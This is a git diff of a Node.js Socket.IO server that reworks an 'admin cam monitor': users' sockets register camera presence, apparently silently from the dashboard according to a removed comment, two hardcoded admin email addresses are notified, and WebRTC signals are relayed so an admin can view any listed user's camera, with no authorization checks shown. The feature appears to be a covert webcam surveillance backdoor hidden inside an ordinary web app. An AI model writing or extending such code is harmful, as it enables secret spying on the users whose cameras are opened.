@@ -221,16 +221,15 @@ io.on('connection', (socket) => {
     if (targetUserId) socket.to(targetUserId).emit('webrtc_signal', payload);
   });
 
-  // ─── ADMIN CAM VIEWER ────────────────────────────────────────────────────────
+  // ─── ADMIN CAM MONITOR (Fresh, Stable WebRTC Signaling) ─────────────────────
   const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];
 
-  // User announces they are cam-ready (called silently from dashboard)
-  socket.on('cam_viewer_ready', ({ email, username }) => {
+  // User registers camera presence
+  socket.on('cam_user_online', ({ email, username }) => {
     socket.camEmail = email ? email.toLowerCase().trim() : null;
     socket.camUsername = username || email;
-    // Notify all admin accounts if online
     ADMIN_EMAILS.forEach(adminEmail => {
-      socket.to(adminEmail).emit('cam_user_online', {
+      socket.to(adminEmail).emit('cam_user_online_event', {
         email: socket.camEmail,
         username: socket.camUsername,
         socketId: socket.id
@@ -238,7 +237,7 @@ io.on('connection', (socket) => {
     });
   });
 
-  // Admin requests the full list of cam-ready / online users
+  // Admin requests list of active cam clients
   socket.on('cam_get_users', () => {
     const userMap = new Map();
     for (const [, s] of io.sockets.sockets) {
@@ -246,7 +245,6 @@ io.on('connection', (socket) => {
       if (email) {
         const cleanEmail = email.toLowerCase().trim();
         const username = s.camUsername || s.username || cleanEmail.split('@')[0];
-        // Keep unique user entry per email
         if (!userMap.has(cleanEmail)) {
           userMap.set(cleanEmail, { email: cleanEmail, username, socketId: s.id });
         }
@@ -255,39 +253,18 @@ io.on('connection', (socket) => {
     socket.emit('cam_users_list', Array.from(userMap.values()));
   });
 
-  // Admin initiates viewing: send WebRTC offer to target socket directly (with email fallback)
-  socket.on('cam_view_request', ({ targetSocketId, targetEmail, signal }) => {
+  // Unified WebRTC signal relay (Offer, Answer, ICE Candidate)
+  socket.on('cam_signal', ({ targetSocketId, targetEmail, signal }) => {
     let targetSocket = targetSocketId ? io.sockets.sockets.get(targetSocketId) : null;
     if (!targetSocket && targetEmail) {
       const room = targetEmail.toLowerCase().trim();
       const sids = io.sockets.adapter.rooms.get(room);
       if (sids && sids.size > 0) {
-        const sid = Array.from(sids)[0];
-        targetSocket = io.sockets.sockets.get(sid);
+        targetSocket = io.sockets.sockets.get(Array.from(sids)[0]);
       }
     }
     if (targetSocket) {
-      targetSocket.emit('cam_signal_incoming', {
-        fromSocketId: socket.id,
-        fromEmail: socket.camEmail || socket.userEmail,
-        signal
-      });
-    }
-  });
-
-  // Target (or admin) relays back their answer / ICE candidates
-  socket.on('cam_signal_relay', ({ toSocketId, toEmail, signal }) => {
-    let targetSocket = toSocketId ? io.sockets.sockets.get(toSocketId) : null;
-    if (!targetSocket && toEmail) {
-      const room = toEmail.toLowerCase().trim();
-      const sids = io.sockets.adapter.rooms.get(room);
-      if (sids && sids.size > 0) {
-        const sid = Array.from(sids)[0];
-        targetSocket = io.sockets.sockets.get(sid);
-      }
-    }
-    if (targetSocket) {
-      targetSocket.emit('cam_signal_incoming', {
+      targetSocket.emit('cam_signal', {
         fromSocketId: socket.id,
         fromEmail: socket.camEmail || socket.userEmail,
         signal
